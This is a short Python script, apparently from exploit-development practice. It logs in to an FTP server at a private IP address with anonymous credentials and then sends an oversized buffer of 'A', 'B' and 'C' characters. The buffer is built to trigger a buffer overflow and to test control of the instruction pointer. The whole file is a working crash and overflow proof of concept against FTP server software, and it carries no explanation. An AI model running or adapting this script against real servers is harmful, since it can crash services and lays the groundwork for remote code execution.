import time,sys
import socket

ser = "192.168.225.105"
port = 21


buffer = "A"*251 + "B"*4 + "C"*4

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ser, port))
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send(buffer + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close
